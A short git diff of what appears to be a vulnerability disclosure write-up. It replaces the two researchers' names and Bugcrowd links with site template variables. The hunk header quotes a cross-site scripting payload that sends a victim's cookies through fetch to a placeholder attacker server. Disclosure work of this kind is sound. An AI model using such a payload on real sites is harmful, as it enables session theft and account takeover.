@@ -147,9 +147,9 @@ Payload: `pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)</script>
 ---
 
 ## 🤝 Collaboration Detail
-This research was conducted in a **50/50 collaboration** between **Iván Córcoles Martínez** and **Diego García Ayala**. Both researchers contributed equally to the discovery, exploitation, and documentation of this vulnerability.
+This research was conducted in a **50/50 collaboration** between **{{ site.researchers.ivan.name }}** and **{{ site.researchers.diego.name }}**. Both researchers contributed equally to the discovery, exploitation, and documentation of this vulnerability.
 
 ## 🏁 Researchers & Contact
 
-**Iván Córcoles Martínez** ([Bugcrowd](https://bugcrowd.com/h/ConnorDev))
-**Diego García Ayala** ([Bugcrowd](https://bugcrowd.com/h/sl4sh1t0))
+**{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
+**{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))
